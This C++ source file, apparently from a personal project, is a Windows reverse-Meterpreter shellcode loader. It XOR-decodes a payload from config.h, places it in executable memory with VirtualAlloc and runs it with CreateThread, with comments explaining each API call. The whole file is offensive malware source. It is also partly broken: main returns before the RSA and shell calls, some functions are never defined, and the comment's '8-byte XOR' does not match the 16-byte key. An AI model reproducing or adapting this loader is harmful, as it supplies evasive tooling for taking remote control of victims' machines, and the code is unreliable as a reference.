/*
|	Author:		lemur
|	GitHub:		https://github.com/1emvr
|	Email:		1emvr@protonmail.com
|	Date:		01/04/2023	03:09 AM
|
|	Very basic x64 Windows reverse Meterpreter with 8-byte XOR.
|	Nerfed because I'm concerned about skids.
*/

#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <math.h>
#include <time.h>

#include <iostream>
#include <cstdint>

#include "config.h"

int RevShell();
unsigned char XORCrypto(u_char[]);

int main() {

	int a = 1;
	int h = 2;

	double p;
	double q;

	time_t t;

	int is_prime = 0;

	while (!is_prime) {

		double p = rand() % 10001 + 1000;
		double q = rand() % 10001 + 1000;

		if (is_prime_check(p, q) == 1) {
			is_prime = 1;
			break;
		}
		else {
			is_prime = 0;
		}
	}
	return p, q;

	RSA_Encrypt(buffer, sizeof(buffer), p, q);

	HWND sneakyboi;
	AllocConsole();

	sneakyboi = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(sneakyboi, SW_SHOWNORMAL);

	RevShell();
	return 0;
	/*
		Handle for the window function FindWindowA():
	
						lpClassName:	The class name "ConsoleWindowClass" changes user-data of a window object.
						lpWindowName:	NULL. It shouldn't have a name. Why would we name it? Wth is wrong with you, man...
	*/
	
	/*
		Arguments for ShowWindow():
	
						hWnd:			The handle of the window.
						nCmdShow:		Controls how the window is displayed.
	*/
}

int RevShell() {

	XORCrypto(buffer);

	DWORD shellcode_size = sizeof(buffer);
	LPVOID exec_memory = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	RtlMoveMemory(exec_memory, buffer, shellcode_size);

	XORCrypto(buffer);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_memory, NULL, 0, NULL);
	/*
		VirtualAlloc() Arguments:
	
			(Optional)	lpAddress,
						dwSize:				Region of bytes
						flAllocationType:	Type of memory allocation
						flProtect:			Protection/Permission types
	*/

	/*
		RtlMoveMemory() Arguments:
	
			*Destination:	Pointer to the destination
			*Source:		Source buffer
			Length:			Size of buffer
	*/

	/*
		CreateThread() Arguments:
	
			(Optional)	lpThreadAttributes:	A pointer to SECURITY_ATTRIBUTES struct for child-process inheritence
						dwStackSize:		Inital size of the stack. If zero, then set to size of executable
						lpStartAddress:		Pointer to the app-defined function to be executed, casting that pointer to notify process-start
						lpParameter:		A pointer to variable to be passed to the thread. If NULL, no extra data will pass
						dwCreationFlags:	Flags controlling creation of the thread. If set to zero, the thread runs immediately after creation
						lpThreadId:			Pointer to a variable that receives the thread ID. If NULL, the thread ID is not returned
	*/
	Sleep(1000);
	return 0;
}

unsigned char XORCrypto(u_char payload[]) {

	u_char key[16] = {
		0x01,0x10,0x02,0x11,0x03,0x12,0x04,0x13,
		0x05,0x14,0x06,0x14,0x07,0x15,0x08,0x16
	};

	for (int i = 0; i < PAYLOAD_MAX_SIZE - 1; i++)
		payload[i] ^= key[i % 16];

	return *payload;
	/*
		XORCrypto() Arguments and vars:
	
			u_char payload array:			Given the global u_char "payload" array
			u_char key array:				Defining an initialized object list as a XOR key
	
			The payload is iterated over the PAYLOAD_MAX_SIZE, minus one, modulating over each
			value in the key list until the end.
	
			This value is returned as a pointer to the calling function.
	*/
}